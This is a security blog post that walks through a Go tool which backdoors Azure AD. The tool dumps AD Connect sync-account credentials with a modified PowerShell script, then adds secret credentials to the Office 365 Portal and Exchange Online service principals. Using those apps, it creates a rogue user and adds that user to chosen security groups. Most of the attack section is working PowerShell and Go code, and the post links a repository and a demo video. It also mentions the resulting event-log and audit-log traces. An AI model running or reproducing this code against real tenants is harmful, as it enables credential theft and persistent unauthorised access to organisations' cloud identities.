---
title: "AzureADSync BackDoor"
date: 2020-05-28T08:53:31-05:00
draft: false
toc: false
images:
layout: ../../layouts/PostLayout.astro
tags:
  - Golang
  - Azure
  - AzureAD
---
<head>
	<style>
		body {
			background-color: #161b22;
			color: #c9d1d9;
		}
		a:hover, a:visited:hover{
			color:red;
		}
		a:visited {
			color: #c9d1d9;
		}
	</style>
</head>

Recently created a golang binary that dumps credentials from the AD Sync Server and creates a user in azure and assigns it to any group in AzureAD you like. Check out the work done by Adam Chester and Dirk-jan at the following links below as this could have not been possible without their hard work and research. Seriously read those both as everything ive done piggybacks of them.

* [Dirk-jan's blog post](https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/)
* [Adam Chester's blog post](https://blog.xpnsec.com/azuread-connect-for-redteam/#more)

## tldr 
Dump AD Sync creds via powershell. Used dotpeek and fiddler to reverse powershell cmdlets since they call graph api. Use those dumped creds to call api. Assign passwords to built in apps with better permissios than Sync Acc. Sign in as those apps and create backdoor.

## NOTE!!! (UPDATE)
the script to dump the ad sync server account password doesnt work anymore, adam chester has an updated script that does fix the issues though. This was written when the original version still worked. microsoft made some changes that broke the original dump script.

## Dump creds?
In my test environment i ran adams powershell POC scipt and noticed it only dumped the on prem sync account credentials.
Which is fantastic as you can now perform a DC Sync attack. But my focus was on pivoting to the cloud with something a little more than user permissions. I was able to modify the script slightly by changing the following lines
```powershell
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerText}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerText}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host "[*] On Prem Credentials"
Write-Host "Domain: $($domain.Domain)"
Write-Host "Username: $($username.Username)"
Write-Host "Password: $($password.Password)"
```
to 
```powershell
$username = select-xml -Content $config -XPath "//parameter[@name='UserName']" | select @{Name = 'Username'; Expression = {$_.node.InnerText}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host "[*] Credentials incoming...`n"
Write-Host "[*] Azure Credentials"
Write-Host "UserName: $($username.UserName)"
Write-Host "Password: $($password.Password)`n"

```

The Details of how the powershell script is able to dump credentials in the first place can be found above (seriously check it out)
I encoded the above powershell script in base64 and run it within the golang code just for ease of use.
The function that performs the dump is below

```go
func DumpCreds()map[string]string {
    posh := New()
    //fmt.Println("With encoding change:")
     stdout, _, err := posh.Execute(`//5XAHIAaQB0AGUALQBIAG8Ac...`)
     s := strings.Split(stdout,"\n")

    fmt.Println(stdout)

    if err != nil {
            fmt.Println(err)
    }

    User := strings.Split(s[10],":")
    Pass := strings.Split(s[11],":")
    UserName := strings.TrimSpace(User[1])
    PassWord := strings.TrimSpace(Pass[1])
    AzureCredsMap := make(map[string]string)
    AzureCredsMap["AzureUserName"] = UserName
    AzureCredsMap["AzurePassWord"] = PassWord
    return AzureCredsMap
```

## Authenticate with dumped creds
So at this point you have the sync account credentials.

![asmi popup](/credsOutput.png)

Now we can authenticate to the graph.windows.net api using go

```go
func auth(resource_url string,credsMap map[string]string,tenantId string) Token_t{
    fmt.Println("\n[*] Attempting to Authenticate to Azure...")
    pass := credsMap["AzurePassWord"]
    user := credsMap["AzureUserName"]
    //os.Exit(2)
    formData := url.Values{
    "grant_type":{"password"},
    "resource":{resource_url},
    "client_id":{"a0c73c16-a7e3-4564-9a95-2bdf47383716"}, //needed as client id its default powershell                      
    "username":{user},
    "password":{pass},
    }
    //fmt.Println(tenantId)
    url := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/token",tenantId)
    resp, err := http.PostForm(url,formData) // contains tenant id
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()
    var result Token_t
    json.NewDecoder(resp.Body).Decode(&result)

    if result.AccessToken == ""{
        fmt.Println("\nYou couldnt get a token, invalid credentials perhaps???\n")
        os.Exit(2)
    }
    fmt.Println("\n[*] Successfully Authenticated To Azure")
    return result
}
```
If successful you get an auth token back.


## Strategy Going Forward
At this point i wasnt sure how to proceed i know i want to list service principals. And this specific api that i am calling is outdated and not documented that well or at all.

So i decided to use the powershell AzureAD Cmdlets and try to see how those call the api. There is a log file that logs all the methods called by the cmdlets. here is an example

![](/pwshlog.png)

You can see calls to get and set service principal...I didnt know what that meant. So i found the dll that correspondes to that cmdlet. 
And loaded it into dotpeek (My new favorite tool)
### dotpeek
Dot peek is amazing. It decompiled the dll and if you highlight a method it allows you to jump to the declaration.
Doing this i was able to see the get and set methods parameters. Which revealed a GET and PATCH request respectively as well as the parameters for the patch

![](/dotpeek.png)

Using this is gained alot of insight. But still i had alot of issues calling the right endpoints since i didnt know exactly what the request body needed to look like to patch a password credential object to a Service principal.

### Fiddler
Fiddler solved all my questions about the api and exactly how requests needed to be formatted.
I was able to install the certificate on my windows machine to see the SSL traffic now in clear text.

![](/fiddler.png)

Now all i needed to do was the folllowing.

![](/powersh.png)


And look at the output on fiddler and model my golang code after that.

## List service principals & roles
After figuring out how to exactly call each api and the format needed i was able to proceed with writing the code based on the fiddler output.
```go
func GetSPs(token string,tenantId string)AllTheSpns_t{
    url := fmt.Sprintf("https://graph.windows.net/%s/servicePrincipals/?api-version=1.6&$top=999",tenantId)
    var bearer = "Bearer " + token
    // Create a new request using http

    req, err := http.NewRequest("GET", url,nil ) //bytes.NewBuffer(jsonStr)
    // add authorization header to the req
    req.Header.Add("Authorization", bearer)
    req.Header.Add("Content-type","application/json")

    // Send req using http Client
    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        log.Println("Error on response.\n[ERRO] -", err)
    }

    defer resp.Body.Close()
    var result AllTheSpns_t

    json.NewDecoder(resp.Body).Decode(&result)

    return result
}
```

## Microsoft Office 365 Portal & Office 365 Exchange Online
I was able to get a list of all service principals available, i didnt have many and needed to add a trial 0365 license to my tenant to view some of the better ones with more permissions such as Microsoft Office 365 Portal & Office 365 Exchange Online.
dirkjan goes into detail on his blog post on assigning credentials to these apps and checking the roles they are assigned.
For some reason i was not able to login to many of the apps after assigning a password credential (i would get back a client secret invalid error). Only a few and the ones that i was able to login to didnt have many roles assigned.
I settled on using Microsoft Office 365 Portal & Office 365 Exchange Online in tandem as one has user.ReadWrite access and the other has group.ReadWrite Access.

## Create user/add to group
Basically the code loops through the list of SPN's returned and looks for those two display names.
Then adds a predefined password credential to both service principals. Logs in as each and creates as user then loops through the azure AD groups available and asks if the user should be added.
```go
SPNs := GetSPs(authToken,TenantId)
    for x := range SPNs.Value{
        if SPNs.Value[x].AppDisplayName == "Microsoft Office 365 Portal"{
            O365Found = true
            fmt.Println("[*] Found 0365 Portal App")
            fmt.Println("[*] Attempting to add Password Credential")
            O365AppObjId := SPNs.Value[x].ObjectID
            O365AppId := SPNs.Value[x].AppID
            fmt.Println("[*] Found Obj ID")
            fmt.Println(O365AppObjId)
            fmt.Println("[*] Found App ID")
            fmt.Println(O365AppId)
            var NewCredsToAdd PasswordCredentials
            NewCredsToAdd.StartDate = now_t
            NewCredsToAdd.EndDate = then_t
            NewCredsToAdd.Value = pwndpass
            SPNs.Value[x].PasswordCredentialss = append(SPNs.Value[x].PasswordCredentialss,NewCredsToAdd)
            Ready2PostPassWords := make(map[string]interface{})
            Ready2PostPassWords["passwordCredentials"] = SPNs.Value[x].PasswordCredentialss
            AddPassResult := AddPasswordToSP(authToken,Ready2PostPassWords,O365AppObjId,TenantId)
            if AddPassResult == "error" {
                fmt.Println("[*] Error Adding PasswordCredential To O365 Portal App")
                fmt.Println("[*] Exiting....")
                os.Exit(2)
            }else{
                fmt.Println("[*] Successfully Added PasswordCredentials To O365 Portal App")
                fmt.Printf("[*] PasswordCredentials :=> %s : %s\n",O365AppId,NewCredsToAdd.Value)
            }
            fmt.Printf("[*] Attempting To Login As The O365 Application...\n")
            O365AuthTokenStruct = authAsSPN("https://graph.windows.net",SPNs.Value[x].AppID,NewCredsToAdd.Value.(string),TenantId)

        }
         if SPNs.Value[x].AppDisplayName == "Office 365 Exchange Online"{
            //fmt.Println(SPNs.Value[x].AppDisplayName)
            ExchangeFound = true
            fmt.Println("[*] Found Exchange Online App")
            fmt.Println("[*] Attempting to add Password Credential")
            ExchangeAppObjId := SPNs.Value[x].ObjectID
            ExchangeAppId := SPNs.Value[x].AppID
            fmt.Println("[*] Found Obj ID")
            fmt.Println(ExchangeAppObjId)
            fmt.Println("[*] Found App ID")
            fmt.Println(ExchangeAppId)
            var NewCredsToAddExchange PasswordCredentials
            NewCredsToAddExchange.StartDate = now_t
            NewCredsToAddExchange.EndDate = then_t
            NewCredsToAddExchange.Value = pwndpass
            SPNs.Value[x].PasswordCredentialss = append(SPNs.Value[x].PasswordCredentialss,NewCredsToAddExchange)
            Ready2PostPassWordsExchange := make(map[string]interface{})
            Ready2PostPassWordsExchange["passwordCredentials"] = SPNs.Value[x].PasswordCredentialss
            AddPassResultExchange := AddPasswordToSP(authToken,Ready2PostPassWordsExchange,ExchangeAppObjId,TenantId)
            if AddPassResultExchange == "error" {
                fmt.Println("[*] Error Adding PasswordCredential To Office 365 Exchange Online App")
                fmt.Println("[*] Exiting....")
                os.Exit(2)
            }else{
                fmt.Println("[*] Successfully Added PasswordCredentials To Office 365 Exchange Online App")
                fmt.Printf("[*] PasswordCredentials :=> %s : %s\n",ExchangeAppId,NewCredsToAddExchange.Value)
            }
            fmt.Printf("[*] Attempting To Login As The Office 365 Exchange Online Application...\n")
            ExchangeAppIdGlobal = SPNs.Value[x].AppID
            ExchangeAuthTokenStruct = authAsSPN("https://graph.windows.net",SPNs.Value[x].AppID,NewCredsToAddExchange.Value.(string),TenantId)

        }
    }
    if ExchangeAuthTokenStruct.AccessToken != "" && O365AuthTokenStruct.AccessToken != "" {
        fmt.Println("[*] Have Auth Tokens For Both Apps...")
    } else {
        fmt.Println("[*] Do Not Have Auth Tokens For Both Apps...Something Went Wrong Exiting...")
        os.Exit(2)
    }
    
    fmt.Println("[*] Creating User Via O365 App...")
    NewUserResult := CreateUser(O365AuthTokenStruct.AccessToken,TenantId,DirectoryName[1],*addedUserptr)
    NewUserObjId := NewUserResult.ObjectID
    fmt.Printf("[*] Successfully Created The Following User: %s@%s Pass: %s\n",*addedUserptr,DirectoryName[1],pwndpass)
    fmt.Println("[*] Using Exchange Online App To Enumerate Groups...")
    EnumGrpResult := EnumerateGroups(ExchangeAuthTokenStruct.AccessToken,TenantId)
    var GrpObjMap = make(map[string]string)
    for x :=  range EnumGrpResult.Value_Grp{
        if EnumGrpResult.Value_Grp[x].SecurityEnabled_Grp == true{
            GrpObjMap[EnumGrpResult.Value_Grp[x].DisplayName_Grp] = EnumGrpResult.Value_Grp[x].ObjectID_Grp
        }
    }
    fmt.Println(GrpObjMap)
    fmt.Println("[*] Successfully Enumerated Groups")

    
    fmt.Println("[*] Reconnecting to Azure Management Resource")
    AzureManagementAuthStruct := authAsSPN("https://graph.microsoft.com",ExchangeAppIdGlobal,pwndpass,TenantId)

    fmt.Println("[*] Unfortunately we dont have permissions to check the assigned group roles")
    for x,y := range GrpObjMap {
        fmt.Printf("Add user to this group? %s y/n or q to quit\n",x)
        var userchoice2 string    
        fmt.Scanln(&userchoice2)
        if userchoice2 == "y"{
            fmt.Printf("Attempting To User To Following Group %s:::%s\n",x,y)
            AddUserToGrp(AzureManagementAuthStruct.AccessToken,TenantId,NewUserObjId,y)
        }else if userchoice2 == "q"{
            break
        } else {
            continue
        }
    }
```


## Well now what
The powershell shows up in event viewer.
![](/event.png)

Also heres what it looks like in the azure AD Audit logs

![](/azaudit.png)

You can see the Sync account updating the service principals and then those applications creating a user and adding to groups respectively.

## Final Thoughts
During the research for the api i used this app even though i knew it was phishy
https://graphexplorer.azurewebsites.net/
And i got my azure test environment hacked...But it was really cool to see some tactics performed by a real adversary.
He invited himself as a guest and created an azure web app proxy to get access to my on prem test env remotely. May look into this in the future. So if anyone wants to set up a honeypot azure tenant that link is the way to do it as its actively being used to target people.

## More Links
* https://www.jetbrains.com/decompiler/
* https://www.telerik.com/fiddler
* https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html
* https://github.com/dirkjanm/ROADtools

## Why Golang?
Idk just trying it out. Probably will go back to learning C though.

## Repo Link
https://github.com/latortuga71/Learning_GO/tree/master/AzureADBackDoor
## POC Video
{{< youtube GW6CC6ZUVfk >}}
